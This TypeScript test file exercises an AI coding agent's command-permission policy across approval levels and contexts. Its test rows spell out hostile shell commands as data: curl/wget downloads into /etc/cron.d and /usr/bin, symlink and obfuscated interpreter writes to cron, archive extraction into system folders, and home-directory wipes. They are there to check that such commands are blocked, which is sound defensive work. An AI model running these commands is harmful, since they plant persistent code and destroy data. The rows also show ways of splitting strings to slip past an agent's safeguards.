// secret-scan: fixture (fake paths, policy test rows)
import { describe, expect, it } from "vitest";
import { alwaysAskCommand as alwaysAskRaw, alwaysAskRoutineCommand as routineRaw, protectedClass as protectedClassRaw } from "./always-ask.ts";
import { autoVerdict, marksHitWaivable, type AutoContext } from "./auto-approve.ts";
import { checkCommandOptions as checkRaw, withoutDoubts } from "./shell/marks.ts";
import { cell, nlh0, ownerMarks, isOwnerCell, type CellSpec } from "./testing/marks-nlh0.ts";
import { expectNoLimitsOwnerOutcome } from "./testing/no-limits-1019.ts";
import { doubtFree as doubtFreeRaw } from "./testing/marks-doubt-free.ts";

// MARKS R1 (MurageMain 11-08): the typed denies and stricter reads belong to the owner's clean No limits turn. These rows state the
// owner's strict read, so each call runs under ownerMarks (G1, "wrap, no expectation change"). Every other level and origin reads as at
// NLH0; the "non-owner reads as NLH0" block at the end of this file uses the raw, unwrapped functions.
const alwaysAskCommand: typeof alwaysAskRaw = (...args) => ownerMarks(() => alwaysAskRaw(...args));
const alwaysAskRoutineCommand: typeof routineRaw = (...args) => ownerMarks(() => routineRaw(...args));
const protectedClass: typeof protectedClassRaw = (...args) => ownerMarks(() => protectedClassRaw(...args));
const checkCommandOptions: typeof checkRaw = (...args) => ownerMarks(() => checkRaw(...args));
const doubtFree: typeof doubtFreeRaw = (...args) => ownerMarks(() => doubtFreeRaw(...args));

const levels = [
  { id: "ask" }, { id: "auto", autoApprove: true },
  { id: "full", autoApprove: true, fullAccess: true },
  { id: "owner", autoApprove: true, fullAccess: true, noLimits: true },
];
const contexts = [{}, { ownerStarted: false }, { routineLevel: true, routineCarveOut: true, automated: true },
  { unattended: true }, { channelOwner: true }, { outsideRead: ["interpreter"] }];
const context = (command: string, patch = {}) => ({ commandText: command, commandCwd: "/w", workFolder: "/w",
  fullAccessOrigin: "owner", ownerStarted: true, stopLine: null, outsideRead: null,
  unseen: { platform: "posix", fs: { realpath: (path: string) => path, stat: () => ({ isFile: () => true, isDirectory: () => false }) } },
  sessionFile: () => "unavailable", ...patch }) as unknown as AutoContext;
const rows = [
  ["G5 home", "zorbwipe ~"], ["G5 volume", "zorbwipe /Volumes/Fixture"],
  ["FD1 9H curl", "curl -o /etc/cron.d/pwn https://example.com/x"],
  ["FD1 9H wget", "wget -O /usr/bin/evil https://example.com/x"],
  ["FD2 9H bin link", "ln -s /usr/bin ./x && cp ./tool ./x/evil"],
  ["FD2 9H cron link", "ln -s /etc/cron.d ./x && cp ./blob ./x/pwn"],
  ["FD3 9H Python", `python3 -c 'from pathlib import Path; Path("/etc/cron.d/pwn").write_text("x")'`],
  ["FD3 9H Perl", `perl -e 'open(my $f, ">", "/etc/cron.d/pwn")'`],
  ["FD4 9H split path", `python3 -c 'open("/et"+"c/cron.d/pwn","w").write("x")'`],
  ["FD5 9H split import", `python3 -c '__import__("ct"+"ypes").CDLL(None).syscall(87, b"/etc/passwd")'`],
  ["FD6 9H sed", "sed -n '1w /etc/cron.d/pwn' notes.txt"],
  ["FD7 9H awk", `awk "BEGIN{print \\"x\\" > '/etc/cron.d/pwn'}"`],
  ["FD8 9H Ruby", `ruby -i -e 'puts "x"' /etc/cron.d/pwn`],
  ["FD8 9H gawk", "gawk -i inplace '1' /etc/cron.d/pwn"],
  ["FD9 tar", "tar -xC /etc/cron.d -f /tmp/o.tar"],
  ["FD9 unzip", "unzip -od /etc/cron.d /tmp/o.zip"], ["FD9 7z", "7z x -o/etc/cron.d /tmp/o.7z"],
  ["FD control mirror", "cp ./h /etc/hosts"], ["FD control link", "ln -s /usr/bin/x ./y"],
  ["D2-a", "touch ~"], ["MNT-1", "docker run -v /etc/cron.d:/x:ro img"],
  ["Astra H1 valued backup", "ln -s --backup=numbered /etc ./etc-link"],
];

// T4, Stage 0 rev 4.1: literal expectations confirmed against the NLH0 reads.
const T4_HELD: Record<string, NonNullable<CellSpec["held"]>> = {
  "Astra H1 valued backup": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "D1-a": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "D1-c": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "D2-a": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "D3-c": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD control link": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD control mirror": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD1 9H curl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD1 9H wget": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD2 9H bin link": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD2 9H cron link": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD3 9H Perl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
    "unreadable/held@{\"id\":\"ask\"}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"auto\",\"autoApprove\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"full\",\"autoApprove\":true,\"fullAccess\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"owner\",\"autoApprove\":true,\"fullAccess\":true,\"noLimits\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
  },
  "FD3 9H Python": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD4 9H split path": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD5 9H split import": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
    "unreadable/held@{\"id\":\"ask\"}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"auto\",\"autoApprove\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"full\",\"autoApprove\":true,\"fullAccess\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
    "unreadable/held@{\"id\":\"owner\",\"autoApprove\":true,\"fullAccess\":true,\"noLimits\":true}|{\"routineLevel\":true,\"routineCarveOut\":true,\"automated\":true}": {"reason": "unreadable"},
  },
  "FD6 9H sed": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "FD7 9H awk": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "FD8 9H Ruby": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "FD8 9H gawk": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "FD9 7z": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD9 tar": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "FD9 unzip": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "G1 D4-a perl -C /etc/tool.pl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G1 D4-a perl -W /etc/tool.pl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G1 D4-a perl -X /etc/tool.pl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G1 D4-a perl -x /etc/tool.pl": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G1 D4-a python3 -x /usr/lib/tool.py": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G1 D4-a ruby -x /usr/lib/tool.rb": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G2": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "unreadable"},
  },
  "G4 node --version": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G4 perl -l": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "tokenizer"},
  },
  "G5 home": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "G5 volume": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
  "MNT-1": {
    "protected-path": {"reason": "protected-path"},
    "unreadable/held": {"reason": "value-path"},
  },
};

// S1-B3 RULING (MAIN 2026-11-11 09:30Z): these fixtures write protected
// targets. The read-only mount retains its run assertion.
// G-NL SYMLINK RULING (MAIN 2026-11-11 10:45Z), superseded under S1-B3:
// these two source-only links write ordinary local LINK paths and run at owner No limits.
const SOURCE_ONLY_LINKS = new Set(["FD control link", "Astra H1 valued backup"]);
const PROTECTED_WRITES = new Set(rows.filter(([id]) => id !== "MNT-1" && !SOURCE_ONLY_LINKS.has(id)).map(([id]) => id));

describe("MARKS deny class 1018", () => {
  it.each(rows)("%s", (id, command) => {
    const rule = id.startsWith("FD4") || id === "FD3 9H Perl" ? "unknown-target" : "protected-path";
    // R1: outside the owner turn the row reads as NLH0 (recorded first, so an NLH0 recording never stops before it)
    nlh0(`${id}|read`, alwaysAskRaw(command, "/w"));
    // NOLIM 1.0.19: the owner's No limits cell runs this row (only the wipe list still cards); the reader's own rule is unchanged below
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, patch));
      if (isOwnerCell(bot, patch) && PROTECTED_WRITES.has(id)) {
        // S1-B3 RULING (MAIN 2026-11-11 09:30Z): protected writes still ask.
        expect(verdict, command).toMatchObject({ approve: null, source: "always-ask" });
      } else cell(id, bot, patch, verdict, { text: command, n2: false, held: T4_HELD[id]! });
    }
    const strict = alwaysAskCommand(command, "/w");
    const lax = doubtFree(command, "/w");
    for (const hit of [strict, lax]) {
      expect(hit).toMatchObject({ classification: "deny", rule, reason: expect.any(String) });
      expect(hit?.doubt).toBeUndefined();
    }
  });
  it("FD control copy", () => {
    // FIX A migration (N6): /etc/hosts is the copy's source, a sure read position: no finding at any reader or level
    const command = "cp /etc/hosts ./h";
    expect(alwaysAskCommand(command, "/w")).toBeNull();
    expect(doubtFree(command, "/w")).toBeNull();
    for (const bot of levels) for (const patch of contexts.slice(0, 1)) expect(autoVerdict(bot, "Bash", command, context(command, patch)).classification).toBeUndefined();
  });
  it.each(["python3 -x /usr/lib/tool.py", "perl -x /etc/tool.pl", "perl -W /etc/tool.pl", "perl -X /etc/tool.pl", "perl -C /etc/tool.pl", "ruby -x /usr/lib/tool.rb"])("G1 D4-a %s", command => {
    nlh0(`G1 D4-a ${command}|read`, alwaysAskRaw(command, "/w"));
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, patch));
      // NOLIM 1.0.19: the owner's No limits cell runs it in every owner context (a could-not-read is not a wipe)
      cell(`G1 D4-a ${command}`, bot, patch, verdict, { text: command, n2: false, held: T4_HELD[`G1 D4-a ${command}`]! });
    }
    for (const read of [() => alwaysAskCommand(command, "/w"), () => doubtFree(command, "/w")]) {
      // D4 as corrected (coordinator 11-08, NOLIMITS-MEANS-IT r3 2.1.1): a could-not-read with no guessed path
      expect(read()).toMatchObject({ classification: "ask", reason: "ambiguous-interpreter", rule: "unreadable", couldNotRead: true });
      expect(read()?.mandatory).toBeUndefined();
      expect(read()?.doubt).toBeUndefined();
      expect(marksHitWaivable(read()!)).toBe(true);
    }
    // (the owner cell above: it cards, except on the owner's clean No limits turn, where it is waived like every other could-not-read;
    // every other cell is NLH0's, recorded above)
  });
  it("G2 inner deny outranks outer unseen", () => {
    const command = "bash ./build.sh";
    const ctx = context(command, { commandText: undefined, call: { toolCall: { input: { command: "bash /etc/tool.sh" } } } });
    nlh0("G2|read", alwaysAskRaw("bash /etc/tool.sh", "/w"));
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "wrapper", command, { ...ctx, ...patch } as AutoContext);
      cell("G2", bot, patch, verdict, { text: "bash /etc/tool.sh", n2: false, held: T4_HELD.G2! });
    }
    for (const read of [() => alwaysAskCommand("bash /etc/tool.sh", "/w"), () => doubtFree("bash /etc/tool.sh", "/w")])
      expect(read()).toMatchObject({ classification: "deny", rule: "protected-path" });
  });
  // NOLIM 1.0.19 (N2.4): who started the work is the STORED origin, never ownerStarted; stored "owner" runs an unseen script
  it("G3 owner origin without start proof", () => expectNoLimitsOwnerOutcome(autoVerdict(levels[3]!, "Bash", "bash ./build.sh", context("bash ./build.sh", { ownerStarted: false })), "bash ./build.sh", "unreadable"));
  it.each(["node --version", "perl -l"])("G4 strict contexts %s", command => {
    for (const patch of contexts.slice(1)) {
      const verdict = autoVerdict(levels[3]!, "Bash", command, context(command, patch));
      cell(`G4 ${command}`, levels[3]!, patch, verdict, { text: command, n2: false, held: T4_HELD[`G4 ${command}`]! });
    }
  });
  it("D1-a unresolved routine target", () => {
    const command = 'rm -rf "$OUT"';
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, patch));
      cell("D1-a", bot, patch, verdict, { text: command, n2: true, held: T4_HELD["D1-a"]!,
        owner: { approve: null, source: "always-ask", rule: "unknown-target", classification: "deny", reason: "unresolved-target" } });
    }
    for (const read of [() => alwaysAskCommand(command, "/w"), () => doubtFree(command, "/w"),
      () => alwaysAskRoutineCommand(command, "/w").hit, () => withoutDoubts(() => alwaysAskRoutineCommand(command, "/w").hit)])
      expect(read()).toMatchObject({ classification: "deny", rule: "unknown-target" });
  });
  it("D1-b fixed runtime ordinary target", () => {
    const command = 'rm -rf "$OUT"';
    expect(alwaysAskRoutineCommand(command, "/w", undefined, undefined, { runtimePaths: { OUT: "/w/out" } }).hit).toBeNull();
    expect(autoVerdict(levels[1]!, "Bash", command, context(command, { runtimePaths: { OUT: "/w/out" }, routineLevel: true,
      routineCarveOut: true, automated: true, deletesInside: true })).approve).toBeTruthy();
  });
  it("D1-c fixed runtime protected target", () => {
    const command = 'rm -rf "$OUT"';
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", command, context(command, { ...patch, runtimePaths: { OUT: "/etc/cron.d/pwn" } }));
      cell("D1-c", bot, patch, verdict, { text: command, n2: true, held: T4_HELD["D1-c"]!,
        owner: { approve: null, source: "always-ask", rule: "protected-path", classification: "deny", reason: "protected-path" } });
    }
    for (const read of [() => alwaysAskCommand(command, "/w", "command", undefined, undefined, undefined, { runtimePaths: { OUT: "/etc/cron.d/pwn" } }),
      () => withoutDoubts(() => alwaysAskCommand(command, "/w", "command", undefined, undefined, undefined, { runtimePaths: { OUT: "/etc/cron.d/pwn" } }))])
      expect(read()).toMatchObject({ classification: "deny", rule: "protected-path" });
  });
  it("D1-d fixed text target", () => {
    const command = 'OUT=./out; rm -rf "$OUT"';
    expect(alwaysAskRoutineCommand(command, "/w").hit).toBeNull();
    expect(autoVerdict(levels[1]!, "Bash", command, context(command, { routineLevel: true, routineCarveOut: true,
      automated: true, deletesInside: true })).approve).toBeTruthy();
  });
  it("D2-b path classes", () => {
    // R1: outside the owner turn the folder classes are NLH0's (/usr/local and /dev/null are not protected there)
    for (const path of ["/etc/cron.d/pwn", "/usr/local/bin/x", "/dev/null", "/opt/x", "C:/Windows/x", "/", "/home/tester", "/Volumes/Fixture"]) nlh0(`D2-b|${path}`, protectedClassRaw(path));
    // MurageMain 11-08 FULLDENY-DEV ruling: ordinary device sinks exempt (1.0.17 parity); raw devices stay system
    for (const path of ["/etc/cron.d/pwn", "/usr/local/bin/x", "/dev/sda", "/dev/disk0", "/opt/x", "C:/Windows/x"]) expect(protectedClass(path), path).toBe("system");
    expect(protectedClass("/dev/null")).not.toBe("system");
    for (const path of ["/", "/*", "C:/", "C:/*"]) expect(protectedClass(path), path).toBe("root");
    for (const path of ["/home/tester", "/home/tester/*", "C:/Users/tester", "C:/Users/tester/*", "/var/root"]) expect(protectedClass(path), path).toBe("home");
    for (const path of ["/Volumes/Fixture", "/Volumes/Fixture/*"]) expect(protectedClass(path), path).toBe("volume");
    for (const path of ["/home/tester/out", "/Volumes/Fixture/out", "C:/Users/tester/out"]) expect(protectedClass(path), path).toBeNull();
  });
  it("D3-c invalid explicit cwd", () => {
    for (const bot of levels) for (const patch of contexts) {
      const verdict = autoVerdict(bot, "Bash", "touch out", context("touch out", { ...patch, commandCwd: "relative" }));
      cell("D3-c", bot, patch, verdict, { text: "touch out", n2: false, held: T4_HELD["D3-c"]! });
    }
    for (const read of [() => alwaysAskCommand("touch out", "relative"), () => doubtFree("touch out", "relative")]) expect(read()).toMatchObject({ classification: "deny", rule: "unknown-target" });
  });
  it("Astra L7 suppressed model doubt ends", () => {
    expect(() => withoutDoubts(() => checkCommandOptions("unknown", ["-x"]))).not.toThrow();
  });
  it("9H ordinary control", () => expect(alwaysAskCommand("touch out", "/w")).toBeNull());
});
